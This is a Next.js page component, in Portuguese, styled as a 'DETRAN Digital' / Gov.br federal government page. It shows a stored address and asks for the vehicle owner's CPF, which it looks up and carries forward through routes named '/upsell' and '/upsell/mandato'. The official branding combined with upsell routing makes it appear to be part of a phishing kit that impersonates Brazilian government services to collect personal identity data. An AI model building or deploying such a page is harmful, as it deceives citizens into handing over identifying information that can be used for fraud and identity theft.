"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { consultarCPF } from "@/app/actions"

export default function EnderecoPage() {
  const router = useRouter()
  const [address, setAddress] = useState<any>(null)
  const [cpf, setCpf] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")

  useEffect(() => {
    const addressData = sessionStorage.getItem("upsell_address")
    if (!addressData) {
      router.push("/upsell")
      return
    }
    setAddress(JSON.parse(addressData))
  }, [router])

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 3) return numbers
    if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`
    if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`
  }

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value)
    setCpf(formatted)
    setError("")
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")
    setIsLoading(true)

    try {
      const result = await consultarCPF(cpf)

      if (result.success && result.data) {
        sessionStorage.setItem("upsell_cpf_data", JSON.stringify(result.data))
        router.push("/upsell/mandato")
      } else {
        setError(result.error || "CPF não encontrado. Verifique e tente novamente.")
      }
    } catch (err) {
      setError("Erro ao consultar CPF. Tente novamente.")
    } finally {
      setIsLoading(false)
    }
  }

  if (!address) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin h-12 w-12 border-4 border-[#1351B4] border-t-transparent rounded-full" />
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#F8F9FA]">
      <header className="bg-[#071D41] py-4 px-4 border-b-4 border-[#FFCD07]">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <img
              src="/images/design-mode/image.png"
              alt="Gov.br"
              className="h-10 w-auto"
            />
            <div className="border-l-2 border-[#FFCD07] pl-3">
              <h1 className="text-white font-bold text-lg">DETRAN Digital</h1>
              <p className="text-[#FFCD07] text-xs">Governo Federal</p>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-2xl mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-lg overflow-hidden border border-gray-200">
          <div className="bg-[#1351B4] text-white p-6 text-center">
            <h3 className="text-xl md:text-2xl font-bold mb-2">Confirme o Endereço</h3>
            <p className="opacity-90">Verifique os dados para envio</p>
          </div>

          <div className="p-6">
            <div className="bg-blue-50 border-2 border-[#1351B4] rounded-lg p-4 mb-6">
              <h4 className="font-bold text-[#071D41] mb-3">Endereço Confirmado</h4>
              <div className="space-y-2 text-sm text-[#555555]">
                <p>
                  <span className="font-semibold text-[#071D41]">CEP:</span> {address.cep}
                </p>
                <p>
                  <span className="font-semibold text-[#071D41]">Logradouro:</span> {address.logradouro}
                </p>
                <p>
                  <span className="font-semibold text-[#071D41]">Bairro:</span> {address.bairro}
                </p>
                <p>
                  <span className="font-semibold text-[#071D41]">Cidade:</span> {address.localidade} - {address.uf}
                </p>
              </div>
            </div>

            <div className="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded mb-6">
              <p className="text-sm text-[#071D41]">
                Para finalizar, precisamos confirmar a identidade do responsável pelo veículo.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label htmlFor="cpf" className="block text-sm font-bold text-[#071D41] mb-2">
                  CPF do Responsável *
                </label>
                <input
                  type="text"
                  id="cpf"
                  value={cpf}
                  onChange={handleCPFChange}
                  placeholder="000.000.000-00"
                  maxLength={14}
                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-[#1351B4] focus:outline-none text-lg"
                  required
                />
                {error && <p className="mt-2 text-sm text-red-600">{error}</p>}
              </div>

              <button
                type="submit"
                disabled={isLoading || cpf.replace(/\D/g, "").length !== 11}
                className="w-full bg-[#1351B4] text-white py-3 rounded-lg font-bold text-lg hover:bg-[#0c3c7a] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? "Verificando..." : "Confirmar e Continuar"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  )
}
